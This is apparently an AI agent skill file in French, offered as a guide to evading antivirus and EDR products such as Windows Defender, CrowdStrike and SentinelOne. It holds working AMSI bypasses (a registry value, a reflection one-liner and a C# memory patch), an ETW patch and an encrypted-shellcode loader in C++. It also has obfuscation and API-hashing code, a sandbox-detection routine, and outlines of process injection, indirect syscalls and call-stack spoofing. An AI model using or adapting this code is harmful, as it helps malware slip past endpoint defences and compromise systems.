---
name: bypass-antivirus
description: Bypass AV/EDR — AMSI bypass, ETW patching, DLL sideloading, obfuscation, packing, shellcode encryption, and evasion de Windows Defender, CrowdStrike, SentinelOne
tags: [bypass, AV, EDR, AMSI, ETW, evasion, obfuscation, shellcode, defender]
version: 1.0
---

# Bypass Antivirus / EDR

Guide de contournement des solutions de sécurité (AV, EDR, XDR) — de l'obfuscation de base aux techniques avancées d'evasion.

## 1. Windows Defender — Bypass Fondamentaux

### AMSI (Anti-Malware Scan Interface)
```powershell
# AMSI intercepte scripts PowerShell, VBS, JS, VBA avant exécution
# Bypass :

# 1. AMSI Bypass — Registry (AmsiEnable)
[HKEY_CURRENT_USER\Software\Microsoft\Windows Script\Settings]
"AmsiEnable"=dword:00000000

# 2. AMSI Bypass — Memory patch (AmsiScanBuffer)
# Patcher le premier byte de AmsiScanBuffer = RET (0xC3)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. AMSI Bypass — Hardware breakpoint
# Set HW BP on AmsiScanBuffer → modify return value

# 4. AMSI Bypass — DLL unhooking
# Map clean copy of amsi.dll → replace hooked section
```

### AMSI Bypass — C# Loader
```csharp
// 1. Patch AmsiScanBuffer via P/Invoke
[DllImport("kernel32.dll")]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll")]
static extern IntPtr LoadLibrary(string lpFileName);

var amsi = LoadLibrary("amsi.dll");
var addr = GetProcAddress(amsi, "AmsiScanBuffer");
byte[] patch = { 0xC3 };  // RET
Marshal.Copy(patch, 0, addr, 1);

// 2. Alternative : WriteProcessMemory
// Patch sur le processus parent
```

### ETW (Event Tracing for Windows)
```csharp
// ETW = telemetry de Windows (EtwEventWrite)
// EDR utilise ETW pour détecter les malwares

// ETW Bypass : patcher EtwEventWrite
[DllImport("ntdll.dll")]
static extern void NtProtectVirtualMemory(...);

var ntdll = LoadLibrary("ntdll.dll");
var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
// Remplacer par RET (0xC3) ou JMP 0
var patch = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };  // XOR RAX, RAX; RET
Marshal.Copy(patch, 0, etwAddr, patch.Length);
```

## 2. Shellcode Obfuscation

### XOR / AES Encryption
```python
# Encoder le shellcode pour éviter les signatures
from Crypto.Cipher import AES
import base64

def encrypt_shellcode(shellcode, key):
    cipher = AES.new(key, AES.MODE_CTR, nonce=b'\x00'*8)
    encrypted = cipher.encrypt(shellcode)
    return base64.b64encode(encrypted)
```

### Shellcode Loader (C++)
```cpp
#include <windows.h>
#include <iostream>

// XOR decrypt
void xor_decrypt(unsigned char* data, int size, unsigned char key) {
    for (int i = 0; i < size; i++)
        data[i] ^= key;
}

int main() {
    unsigned char encrypted[] = { /* encrypted shellcode */ };
    int size = sizeof(encrypted);
    
    // Décryptage
    xor_decrypt(encrypted, size, 0xAA);
    
    // Technique : Vectored Exception Handler (VEH)
    // pour éviter que l'AV scanne la mémoire
    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, encrypted, size);
    
    // Changer protection en dernier moment
    // (évite RWX qui est suspect)
    DWORD old;
    VirtualProtect(exec, size, PAGE_EXECUTE_READ, &old);
    
    ((void(*)())exec)();
    return 0;
}
```

### Shellcode Loader — Callbacks
```csharp
// Utiliser des callbacks Windows pour éviter CreateThread
// Threadless injection

[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(...);

// APC Injection
QueueUserAPC(callback, thread, param);

// Timer callback
CreateTimerQueueTimer(out timer, IntPtr.Zero, callback, arg, 0, 100, 0);

// WaitForSingleObject callback
RegisterWaitForSingleObject(...);
```

## 3. Process Injection Techniques

### Classic CreateRemoteThread
```csharp
// Trop détecté (CreateRemoteThread = signature)
// Alternatives :
// - NtCreateThreadEx (syscall direct)
// - RtlCreateUserThread
// - SetThreadContext (RIP hijack)
// - QueueUserAPC
// - Early Bird APC (CreateProcess suspended)
```

### Process Hollowing
```csharp
// 1. CreateProcess(suspend)
// 2. NtUnmapViewOfSection (original image)
// 3. VirtualAllocEx (new image)
// 4. WriteProcessMemory (PE headers + sections)
// 5. SetThreadContext (entry point)
// 6. ResumeThread
```

### Reflective DLL Injection
```csharp
// Charger une DLL depuis la mémoire sans toucher le disque
// Implémente son propre loader :
// 1. Parse PE headers
// 2. Load sections
// 3. Resolve imports (IAT)
// 4. Relocate
// 5. Execute DllMain
// 6. Résoudre les exports
```

### Dynamic Invocation (C#)
```csharp
// C# sans P/Invoke direct (D/Invoke)
// Résoudre les API dynamiquement via GetProcAddress
// Évite les signatures IAT

// Utiliser D/Invoke (TheWover)
// Win32 API calls resolved at runtime via GetProcAddress
```

## 4. Indirect Syscalls

### Hell's Gate
```asm
; Résoudre les SSN (System Service Numbers) dynamiquement
; Éviter les hooks EDR dans ntdll.dll

; 1. Trouver syscall dans ntdll.dll
; 2. Lire le SSN (mov eax, SSN)
; 3. Appeler syscall en évitant le hook

; Halos Gate : variante pour les syscalls hookés
; Chercher un syscall non-hooké, calculer offset
```

### SysWhispers
```python
# Générer des wrappers pour syscalls indirects
# python3 syswhispers.py --function NtCreateProcess,NtAllocateVirtualMemory
# Output : syscalls.c, syscalls.h
# Utilise Hell's Gate / Halo's Gate
```

### Fresh ntdll.dll
```csharp
// 1. Load ntdll.dll from disk (fresh copy)
// 2. Resolve syscall stubs from fresh copy
// 3. Utiliser ces stubs → pas de hooks

// Alternative : knownDlls (partial)
// ntdll.dll est dans KnownDlls → peut être mapé depuis le cache
```

## 5. Obfuscation Techniques

### Control Flow Obfuscation
```csharp
// - Opaque predicates
// - Dead code insertion
// - Function splitting
// - Junk code
// - Indirect call targets

// Outils :
// - ConfuserEx (.NET)
// - Obfuscator-LLVM (native)
// - InvisibilityCloak (C#)
```

### String Obfuscation
```csharp
// Ne jamais laisser de strings en clair
// - Split strings
// - XOR/AES encrypt
// - Dynamic resolution
// - Stack strings (char by char)

public static string Deobfuscate(string data, int key) {
    char[] chars = data.ToCharArray();
    for (int i = 0; i < chars.Length; i++)
        chars[i] ^= (char)(key + i);
    return new string(chars);
}
```

### API Hashing
```csharp
// Éviter les strings d'API dans le binaire
// Hacher le nom de l'API → comparer au runtime

uint Hash(string s) {
    uint hash = 0;
    foreach (char c in s)
        hash = ((hash << 5) + hash) + c;
    return hash;
}

// Runtime : hacher, comparer, résoudre
```

## 6. Sandbox / VM Detection

```csharp
// Éviter l'exécution dans les sandbox
bool IsSandbox() {
    // 1. Check CPU cores
    if (Environment.ProcessorCount < 2) return true;
    
    // 2. Check RAM
    if (new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory < 2L * 1024 * 1024 * 1024)
        return true;
    
    // 3. Check disk size
    // 4. Check MAC address (VMware, VirtualBox)
    // 5. Check running processes (vmtoolsd, vboxservice)
    // 6. Check registry (HKLM\SYSTEM\CurrentControlSet\Services)
    // 7. Check hardware (BIOS string)
    // 8. Sleep with API call (detect time manipulation)
    // 9. Perform user interaction check (mouse movements)
    return false;
}
```

## 7. EDR Evasion — Call Stack Spoofing

```csharp
// EDR vérifie la call stack des syscalls
// Si call stack = kernel32.dll → ntdll.dll → syscall → ok
// Si call stack = custom code → ntdll.dll → syscall → MALICIOUS

// Technique : masquer la call stack
// 1. Trouver une adresse de retour légitime
// 2. L'écrire sur la stack avant le syscall
// 3. EDR voit une call stack "propre"
```

## 8. Detection Avoidance

### Timing Attacks
```csharp
// Sandbox accélèrent le temps
// 1. NtDelayExecution avec délai > 30s
// 2. Vérifier si le temps réel correspond
// 3. Sleep → différence entre QueryPerformanceCounter et GetTickCount

// sleep(60000) → si exécuté en < 1s → sandbox
```

### Direct I/O
```csharp
// Éviter les API hookées
// Lire/écrire directement sur le disque via \\.\PhysicalDrive
// Contourner les hooks filesystem auraient
```

## 9. Tools Compendium

| Outil | Usage |
|-------|-------|
| **SysWhispers** | Indirect syscall generation |
| **D/Invoke** | Dynamic API resolution |
| **Donut** | .NET loader → shellcode |
| **ScareCrow** | Shellcode loader (bypass AMSI/ETW) |
| **Shellter** | PE injection |
| **Veil** | Payload generator |
| **FatRat** | Multi-format payload |
| **Cobalt Strike ArtifactKit** | Custom artifact generation |
| **PEzor** | PE packing + obfuscation |
| **InvisibilityCloak** | C# obfuscation |
| **ConfuserEx** | .NET obfuscator |
| **Obfuscator-LLVM** | Native obfuscation |
| **Hyperion** | PE crypter (AES) |
| **TheEnigma** | PE protector |

## 10. Ressources

- **Sektor7** : https://institute.sektor7.net (RTO courses)
- **ZeroPointSecurity** : https://zeropointsecurity.co.uk (EDR evasion)
- **MaldevAcademy** : https://maldevacademy.com
- **Cobalt Strike Blog** : https://www.cobaltstrike.com/blog
- **Kerberos** : Awesome EDR Evasion (GitHub)
- **TheWover** : D/Invoke & Hell's Gate
- **RastaMouse** : AMSI bypass techniques
- **Matterpreter** : Offensive security tools
- **ALLES! CTF** : EDR bypass challenges